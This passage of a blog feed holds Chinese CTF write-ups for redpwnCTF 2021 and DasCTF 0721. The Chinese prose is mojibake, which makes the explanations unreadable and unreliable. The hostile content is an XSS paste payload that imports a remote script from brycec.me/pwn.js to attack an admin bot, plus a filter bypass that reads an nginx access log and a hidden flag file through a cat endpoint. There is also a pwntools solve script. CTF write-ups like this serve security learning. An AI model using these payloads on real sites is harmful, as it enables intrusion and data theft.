&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">})();&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä¸ºäº†å¼•å…¥è¿™ä¸ªè„šæœ¬ï¼Œæˆ‘ä»¬æ–°å»ºä¸€ä¸ªpaste&lt;/p>
&lt;pre tabindex="0">&lt;code>${import(String.fromCharCode(47).repeat(2) + /brycec.me/.source + String.fromCharCode(47) + /pwn.js/.source)}
&lt;/code>&lt;/pre>&lt;p>å…¶ä»–å‡ ä¸ªç‰ˆæœ¬çš„è„šæœ¬ï¼š&lt;a href="https://gist.github.com/parrot409/6782796ba9be2088a57a679c27f4e037">ver2&lt;/a> &lt;a href="https://gist.github.com/maple3142/10e3d6f03e307016e54e7f9b6073214a">ver3&lt;/a>&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://xsleaks.dev/">XSLeaks&lt;/a> | &lt;a href="https://owasp.org/www-pdf-archive/Side_Channel_Vulnerabilities.pdf">Side Channel Vulnerabilities on the Web - Detection and Preventio&lt;/a> | &lt;a href="https://dormousehole.readthedocs.io/en/latest/patterns/flashing.html">Flask æ¶ˆæ¯é—ªç°&lt;/a>&lt;/p>
&lt;h2 id="webwtjs">web/wtjs&lt;/h2>
&lt;blockquote>
&lt;p>Ya like golf? How about JS golf?&lt;/p>
&lt;p>&lt;a href="https://wtjs.mc.ax/">wtjs.mc.ax&lt;/a> | &lt;a href="https://admin-bot.mc.ax/wtjs">Admin bot&lt;/a>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/fb14645b75d85a5243bc734b968756485e25c3a1bcb969662a50de2a13982dcf/wtjs.tar">wtjs.tar&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710163120317.png" alt="image-20210710163120317">&lt;/p>
&lt;p>â€¦â€¦â€¦â€¦â€¦â€¦æœ‰å­—æ•°é™åˆ¶çš„fuckjsï¼Œæˆ‘ä¸ä¼šæ„é€  å¤ªç—›è‹¦äº†&lt;/p>
&lt;p>wpå‚è§&lt;a href="https://docs.google.com/spreadsheets/d/1JGIqgt7aSLYM29ksMPIw2YmIRKEyIvZxXGQJfw7U9Fo/edit#gid=0">ä¸€å¼ google sheet&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#wtjs">wp2&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200428355.png" alt="image-20210716200428355">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716200446450.png" alt="image-20210716200446450">&lt;/p>
&lt;p>ä¸å¾—ä¸è¯´ï¼Œè¿™ä¸ªsheetçœŸçš„æ˜¯ç›¸å½“æ¸…æ™°äº†â€¦â€¦ç”¨9å¼ è¡¨ è¯¦ç»†çš„å†™äº†ä¸€ä¸‹åˆ°åº•æ˜¯æ€ä¹ˆæŠŠæœ€ç»ˆçš„payloadç»™æ‹¼å‡ºæ¥çš„ï¼ŒçœŸçš„æ˜¯ç°ä»£ç‰ˆæ´»å­—å°åˆ· ç»äº† æ•°å­—æ°‘å·¥æ˜¯å§ğŸ˜…&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716203047760.png" alt="image-20210716203047760">&lt;/p>
&lt;p>å±å®æ˜¯èšŒåŸ ä½äº†ğŸ˜…&lt;/p>
&lt;h2 id="webmdbin">***web/MdBin&lt;/h2>
&lt;blockquote>
&lt;p>Need a nice, customizable pastebin service for all those markdown notes you need to share? Look no further! Powered by the latest in Web Technologiesâ„¢, including React, this pastebin has you covered, with brand-new theming support!&lt;/p>
&lt;p>&lt;a href="https://mdbin.mc.ax/">mdbin.mc.ax&lt;/a>&lt;/p>
&lt;p>Submit to the admin at &lt;a href="https://admin-bot.mc.ax/mdbin">admin-bot.mc.ax/mdbin&lt;/a>; the flag is in a cookie.&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/35ee9be7cfa1b5fa6127e412b87ef3b8f6f1f99c676303db4cd18f13605281f5/mdbin.tar.gz">mdbin.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>å‚è€ƒï¼š&lt;a href="https://ethanwu.dev/blog/2021/07/14/redpwn-ctf-2021-md-bin/">wp1&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#mdbin">wp2&lt;/a>&lt;/p>
&lt;p>ç›´æ¥æ”¾å‚è€ƒçš„wpé“¾æ¥å§ï¼Œè¿˜æ˜¯jsåŸå‹æ±¡æŸ“çš„é—®é¢˜ï¼Œä½†æ˜¯ç”±äºæˆ‘å¯¹jsåŸå‹æ±¡æŸ“è¿™ä¸ªé—®é¢˜äº†è§£çš„ä¸å¤Ÿæ·±å…¥ï¼Œä¹Ÿåªèƒ½ç…§çŒ«ç”»è™çš„å¤ç°ï¼Œè¿˜æœ‰å¾ˆå¤šèµ„æ–™éœ€è¦é¢å¤–çš„å»è¡¥å……åœ°çœ‹ï¼Œå°±ä¸ç­é—¨å¼„æ–§äº†ï¼Œä¸Šé¢çš„ä¸¤ä¸ªé“¾æ¥é‡Œå†™çš„éƒ½å¾ˆå¥½ï¼&lt;/p>
&lt;h2 id="weblazy-admin">***web/lazy-admin&lt;/h2>
&lt;blockquote>
&lt;p>Looks like another service with no functionality. I hope the admin is doing their job&amp;hellip;&lt;/p>
&lt;p>&lt;a href="https://lazy-admin.mc.ax/">lazy-admin.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/5b2fc5a6d531a90e7f8f31975fcd4bdcd9863a5bb6bcb63df1d4cfd4ad7325b6/lazy-admin.tar.gz">lazy-admin.tar.gz&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>å‚è€ƒï¼š&lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#lazy-admin">wp&lt;/a>&lt;/p>
&lt;p>éš¾ï¼Œæˆ‘ä¸æ‡‚&lt;/p>
&lt;h2 id="miscsanity-check">misc/sanity-check&lt;/h2>
&lt;blockquote>
&lt;p>I get to write the sanity check challenge! Alright!&lt;/p>
&lt;p>&lt;code>flag{1_l0v3_54n17y_ch3ck_ch4ll5}&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;h2 id="miscdiscord">misc/discord&lt;/h2>
&lt;blockquote>
&lt;p>Join the &lt;a href="https://pwn.red/discord">discord&lt;/a>! I hear &lt;code>#rules&lt;/code> is an incredibly engaging read.&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124614902.png" alt="image-20210710124614902">&lt;/p>
&lt;h2 id="misccompliant-lattice-feline">misc/compliant-lattice-feline&lt;/h2>
&lt;blockquote>
&lt;p>get a flag! &lt;code>nc mc.ax 31443&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710124835520.png" alt="image-20210710124835520">&lt;/p>
&lt;h2 id="miscthe-substitution-game">*misc/the-substitution-game&lt;/h2>
&lt;blockquote>
&lt;p>&lt;code>nc mc.ax 31996&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/e8ab069cf5ede93ff8f0aec7f441b7f5f69500ff049b7c3fc27a5949ecc12d90/chall.py">chall.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>Markov Algorithmç½¢äº†&lt;/p>
&lt;p>å‚è§ï¼š&lt;a href="https://mao.snuke.org/">Markov Algorithm Online&lt;/a>&lt;/p>
&lt;h2 id="miscannabel-lee">misc/annaBEL-lee&lt;/h2>
&lt;blockquote>
&lt;p>sounds from a kingdom by the sea&lt;/p>
&lt;p>The server does not produce any visible output; please take a close look at what it is sending before asking if the server is broken.&lt;/p>
&lt;p>What exactly &lt;em>is&lt;/em> the server sending? Sometimes it makes a sound, sometimes it doesn&amp;rsquo;t. Plotting it on a chart might help you see something.&lt;/p>
&lt;p>It might be helpful to turn your sound on, but you&amp;rsquo;ll probably want to write all of it down since your terminal might not catch everything fast enoughâ€”maybe slow it down to get a better idea.&lt;/p>
&lt;p>This is not audio steganography. Apologies if anyone went down that route.&lt;/p>
&lt;p>&lt;code>nc mc.ax 31845&lt;/code>&lt;/p>
&lt;/blockquote>
&lt;p>ncè¿å…¥åæ²¡æœ‰ä»»ä½•å¯è§†çš„å›æ˜¾ï¼Œä½†æ˜¯è—åœ¨äº†å£°éŸ³ä¿¡æ¯é‡Œ&lt;/p>
&lt;pre tabindex="0">&lt;code>\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x00\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x00\x00\x00\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x00\x07\x00\x00\x00\x07\x00\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x00\x00\x07\x00\x07\x07\x07\x00\x07\x00\x07\x00\x00\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x07\x07\x07\x00\x07\x00\x07\x07\x07\x00\x00\x00
&lt;/code>&lt;/pre>&lt;p>å¯¼å‡ºï¼Œæœ‰ä¸¤ç§å€¼ï¼šno bell(\x00) bell(\x07)ï¼Œè½¬åŒ–ä¸º0ä¸1&lt;/p>
&lt;pre tabindex="0">&lt;code>101110101000100011100011100010001011101000101010000000101110101000111011101110001011101110001000101110100011101110101011101110000000111010111010001010101000101110001110100011101110100010000000101110111010001011100010111010001000111010001010100000001110001110111011100000001110101110100010101110001011101000101110101000111010111011100011101110111010101000000010101110100010111010100010111000111011101000111010111011101000111010100010111011101110111000111010001110111010001110101010101110001110101000111011101110111011100011101000111011101110111010001110101010101110001110111010001110111011101110111000100010101000111010101010111000111000101010100010101011101110001110101010101110001011100011101000111010001011100011101010101011100011101010100010101011101110001011101010001110101110111010111000
&lt;/code>&lt;/pre>&lt;p>æ”¹ä¸ºè«æ–¯ç”µç çš„æ ·å­&lt;/p>
&lt;pre tabindex="0">&lt;code>.-.. . - - . .-. ... | .-.. --- .-- . .-. --..-- | -.-. .... .- -. --. . | .--. .- .-. . -. ... | - --- | -.-. ..- .-. .-.. -.-- ---... | ..-. .-.. .- --. -.--. -.. .---- -. --. -....- -.. ----- -. ----. -....- --. ----- . ... -....- - .... ...-- -....- .- -. -. .- -....- -... ...-- .-.. -.--.-
&lt;/code>&lt;/pre>&lt;p>è§£å¯†&lt;/p>
&lt;pre tabindex="0">&lt;code>LETTERS LOWER, CHANGE PARENS TO CURLY: FLAG(D1NG-D0N9-G0ES-TH3-ANNA-B3L)
&lt;/code>&lt;/pre>&lt;p>&lt;code>flag{d1ng-d0n9-g0es-th3-anna-b3l}&lt;/code>&lt;/p>
&lt;h2 id="cryptoscissor">crypto/scissor&lt;/h2>
&lt;blockquote>
&lt;p>I was given this string and told something about scissors. &lt;code>egddagzp_ftue_rxms_iuft_rxms_radymf&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/44dbfcfa8c7590e5afc686ce9d608ddf886c41ef1eee8b86a860af011dc26d73/encrypt.py">encrypt.py&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710135412576.png" alt="image-20210710135412576">&lt;/p>
&lt;h2 id="cryptobaby">crypto/baby&lt;/h2>
&lt;blockquote>
&lt;p>I want to do an RSA!&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/aaa49d90f7e2f6dda3ed8476879729955fefd68130dbc678e7d872dc2bcd825b/output.txt">output.txt&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;pre tabindex="0">&lt;code>n: 228430203128652625114739053365339856393
e: 65537
c: 126721104148692049427127809839057445790
&lt;/code>&lt;/pre>&lt;p>&lt;del>ä¸€ç‚¹éƒ½ä¸ä¼šcryptoâ€¦â€¦&lt;/del> å…¶å®æŸ¥ä¸€ä¸‹&lt;code>RSA n e c&lt;/code>å…¶å®å°±èƒ½åšå‡ºæ¥åé¢çš„ä¸œè¥¿äº†&lt;/p>
&lt;p>&lt;a href="https://stackoverflow.com/questions/49878381/rsa-decryption-using-only-n-e-and-c">RSA decryption using only n e and c&lt;/a> ç„¶åå°±ä¼šçŸ¥é“è¿™ä¸ªä¸œè¥¿ &lt;a href="https://github.com/Ganapati">Ganapati&lt;/a>/&lt;a href="https://github.com/Ganapati/RsaCtfTool">RsaCtfTool&lt;/a>ï¼Œæˆ–è€…è¿™ä¸ªåœ¨çº¿ç½‘ç«™ &lt;a href="https://www.dcode.fr/rsa-cipher">RSA Cipher&lt;/a>&lt;/p>
&lt;p>ä¸ºäº†decodeé¦–å…ˆéœ€è¦æ ¹æ®Næ±‚å‡ºä¸¤ä¸ªäº’è´¨çš„på’Œqï¼Œå¯ä»¥ç”¨è¿™ä¸ªç½‘ç«™æ¥åš &lt;a href="https://zh.numberempire.com/numberfactorizer.php">æ•´æ•°åˆ†è§£å·¥å…·&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172732092.png" alt="image-20210716172732092">&lt;/p>
&lt;p>ä¹‹åå°±å¯ä»¥æ„‰å¿«çš„è§£å¯†äº†ï¼&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716172627393.png" alt="image-20210716172627393">&lt;/p>
&lt;h2 id="revwstrings">rev/wstrings&lt;/h2>
&lt;blockquote>
&lt;p>Some strings are wider than normal&amp;hellip;&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/c3c2ce7829ac7fb904ab02de13b4fbdda69232159c7a5dfa6d7d0fa37606a45d/wstrings">wstrings&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210808184746679.png" alt="image-20210808184746679">&lt;/p>
&lt;p>&lt;code>flag{n0t_al1_str1ngs_ar3_sk1nny}&lt;/code>&lt;/p>
&lt;h2 id="revbread-making">rev/bread-making&lt;/h2>
&lt;blockquote>
&lt;p>My parents aren&amp;rsquo;t home! Quick, help me make some bread please&amp;hellip; &lt;code>nc mc.ax 31796&lt;/code>&lt;/p>
&lt;p>Downloads: &lt;a href="https://static.redpwn.net/uploads/9eee9f077b941e88e1fe75d404582d4f286d9c74729f3ad0d1bb44a527579af8/bread">bread&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710154321719.png" alt="image-20210710154321719">&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://github.com/dudnamedcyan/Redpwn2021_Writeup/blob/main/rev/bread-making.md">wp2&lt;/a> &lt;a href="https://codingmace.gitbook.io/masterward/ctf/2021/redpwn-2021#bread-making">wp3&lt;/a> &lt;a href="https://www.notion.so/bread-making-SOLVED-5cb97be799fc4fee8cd97738a9141713">wp4&lt;/a>&lt;/p>
&lt;p>æˆ‘å½“æ—¶çš„æ€è·¯å’Œæƒ³æ³•å¤§è‡´è¿˜æ˜¯å¯¹çš„ï¼Œ~~ï¼ˆè™½ç„¶æ²¡æœ‰åšå‡ºæ¥å§ï¼‰~~è¿™ä¸ªå°±æ˜¯å…ˆæå–å‡ºæ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œç„¶åç”¨é€»è¾‘ åœ¨äº¤äº’æ¨¡å¼ä¸‹ç”¨æ­£ç¡®çš„é¡ºåºè¾“å…¥ å®Œæ•´çš„é¡ºä¸‹æ¥è¿™ä¸ªæµç¨‹ï¼Œæœ€åæ‹¿åˆ°flagï¼Œæœ€åçš„æ­£ç¡®é¡ºåºæ˜¯è¿™æ ·çš„&lt;/p>
&lt;pre tabindex="0">&lt;code>add ingredients to the bowl
add flour
add yeast
add salt
add water
hide the bowl inside a box
wait 3 hours
work in the basement
preheat the toaster oven
set a timer on your phone
watch the bread bake
pull the tray out with a towel
unplug the fire alarm
open the window
unplug the oven
clean the counters
flush the bread down the toilet
wash the sink
get ready to sleep
close the window
replace the fire alarm
brush teeth and go to bed
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716181440958.png" alt="image-20210716181440958">&lt;/p>
&lt;p>The flag is: &lt;code>flag{m4yb3_try_f0ccac1a_n3xt_t1m3???0r_dont_b4k3_br3ad_at_m1dnight}&lt;/code>&lt;/p>
&lt;p>è°ƒè¯•çš„è¿‡ç¨‹æ˜¯linuxä¸‹çš„pyè„šæœ¬&lt;/p>
&lt;pre tabindex="0">&lt;code>from pwn import *
p = remote(&amp;quot;mc.ax&amp;quot;, 31796)
p.sendlineafter(&amp;quot;bowl&amp;quot;, &amp;quot;add flour&amp;quot;)
p.sendlineafter(&amp;quot;flour has been added&amp;quot;, &amp;quot;add yeast&amp;quot;)
p.sendlineafter(&amp;quot;yeast has been added&amp;quot;, &amp;quot;add salt&amp;quot;)
p.sendlineafter(&amp;quot;salt has been added&amp;quot;, &amp;quot;add water&amp;quot;)
p.sendlineafter(&amp;quot;lumpy dough&amp;quot;, &amp;quot;hide the bowl inside a box&amp;quot;)
p.sendlineafter(&amp;quot;to rise&amp;quot;, &amp;quot;wait 3 hours&amp;quot;)
p.sendlineafter(&amp;quot;finish the dough&amp;quot;, &amp;quot;work in the basement&amp;quot;)
p.sendlineafter(&amp;quot;needs to be baked&amp;quot;, &amp;quot;preheat the toaster oven&amp;quot;)
p.sendlineafter(&amp;quot;for 45 minutes&amp;quot;, &amp;quot;set a timer on your phone&amp;quot;)
p.sendlineafter(&amp;quot;awfully long time&amp;quot;, &amp;quot;watch the bread bake&amp;quot;)
p.sendlineafter(&amp;quot;no time to waste&amp;quot;, &amp;quot;pull the tray out with a towel&amp;quot;)
p.sendlineafter(&amp;quot;smoke in the air&amp;quot;, &amp;quot;unplug the fire alarm&amp;quot;)
p.sendlineafter(&amp;quot;in another room&amp;quot;, &amp;quot;open the window&amp;quot;)
p.sendlineafter(&amp;quot;air rushes in&amp;quot;, &amp;quot;unplug the oven&amp;quot;)
p.sendlineafter(&amp;quot;kitchen is a mess&amp;quot;, &amp;quot;wash the sink&amp;quot;)
p.sendlineafter(&amp;quot;sink is cleaned&amp;quot;, &amp;quot;clean the counters&amp;quot;)
p.sendlineafter(&amp;quot;counters are cleaned&amp;quot;, &amp;quot;flush the bread down the toilet&amp;quot;)
p.sendlineafter(&amp;quot;is disposed of&amp;quot;, &amp;quot;get ready to sleep&amp;quot;)
p.sendlineafter(&amp;quot;go to sleep&amp;quot;, &amp;quot;close the window&amp;quot;)
p.sendlineafter(&amp;quot;window is closed&amp;quot;, &amp;quot;replace the fire alarm&amp;quot;)
p.sendlineafter(&amp;quot;alarm is replaced&amp;quot;, &amp;quot;brush teeth and go to bed&amp;quot;)
p.interactive()
p.close()
&lt;/code>&lt;/pre>&lt;p>è¿™ä¸ªè„šæœ¬çš„é€»è¾‘æ˜¯é€šè¿‡breadæ–‡ä»¶å¯¼å‡ºçš„æ–‡æœ¬ï¼Œæ‰¾å‡ºæœ€ç¬¦åˆé€»è¾‘çš„ä¸Šä¸‹æ–‡ ç„¶ååˆ©ç”¨sendlineaferæ¥è§£é¢˜ï¼›å®é™…åšé¢˜çš„è¯ä¸å¯èƒ½åªé æ‰“å­—æ¥è¯•è¿™ä¸ªé¡ºåº ä¸æ˜¯è¯´è¯•è¿™ä¸ªæµªè´¹æ—¶é—´ è€Œæ˜¯ç­‰å¾…çš„æ—¶é—´éå¸¸éå¸¸çŸ­æš‚ æ²¡æœ‰å®Œæ•´æ‰“å®Œå­—çš„æ—¶é—´&lt;/p>
&lt;h2 id="åè®°">åè®°&lt;/h2>
&lt;p>è¿™æ¬¡çš„redpwnæœ‰47é“é¢˜ï¼Œå„ä¸ªæ–¹å‘éƒ½æœ‰é€‚åˆæˆ‘è¿™ç§ç­¾åˆ°é€‰æ‰‹çš„ç®€å•é¢˜ï¼Œå¥½è¯„~&lt;/p>
&lt;p>å°±æ˜¯æ‰“æ˜Ÿå·çš„é¢˜æ¶‰åŠåˆ°çš„jsåŸå‹æ±¡æŸ“é—®é¢˜ï¼Œå…‰é è¿™ä¸€ä¸¤ä¸ªé¢˜æä¸å¤ªæ‡‚ï¼Œä½†æ˜¯æœ€è¿‘çš„ååºåˆ—åŒ–é—®é¢˜è¿˜æ²¡æ€»ç»“å®Œï¼Œä¸‰å¿ƒäºŒæ„çš„ä¹Ÿä¸å¤ªå¥½ï¼Œä½†æ˜¯ä¹‹åä¸€å®šä¼šå›æ¥çœ‹çš„ï¼ï¼ï¼ç­‰ç€è¢«é­å°¸å§ å“¼&lt;/p></description></item><item><title>DasCTF0721 Wp</title><link>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</link><pubDate>Thu, 05 Aug 2021 23:15:47 +0800</pubDate><guid>https://amiaaaz.github.io/2021/08/05/dasctf0721-wp/</guid><description>&lt;h2 id="cat-flag">cat flag&lt;/h2>
&lt;blockquote>
&lt;p>ç®€ç®€å•å•cat flag&lt;/p>
&lt;p>Hint: ç®¡ç†å‘˜æ›¾è®¿é—®è¿‡flag&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">isset&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">]))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;cmd&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag/i&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">escapeshellarg&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">system&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;cat &amp;#39;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$cmd&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">__FILE__&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>æç¤ºç®¡ç†å‘˜è®¿é—®è¿‡ï¼Œå…ˆ&lt;code>cat /var/log/nginx/access.log&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210802142131657.png" alt="image-20210802142131657">&lt;/p>
&lt;p>ä¹‹åç”¨&lt;code>%fa&lt;/code>ç»•è¿‡ &lt;code>/?cmd=this_is_final_fl%faag_e2a457126032b42d.php&lt;/code>&lt;/p>
&lt;p>review - &lt;strong>Nginx é‡è¦æ–‡ä»¶ç›®å½•ï¼š&lt;/strong>&lt;/p>
&lt;ul>
&lt;li>é…ç½®æ–‡ä»¶å­˜æ”¾ç›®å½•ï¼š/etc/nginx&lt;/li>
&lt;li>ä¸»è¦é…ç½®æ–‡ä»¶ï¼š/etc/nginx/conf/nginx.conf&lt;/li>
&lt;li>ç®¡ç†è„šæœ¬ï¼š/usr/lib64/systemd/system/nginx.service&lt;/li>
&lt;li>æ¨¡å—ï¼š/usr/lisb64/nginx/modules&lt;/li>
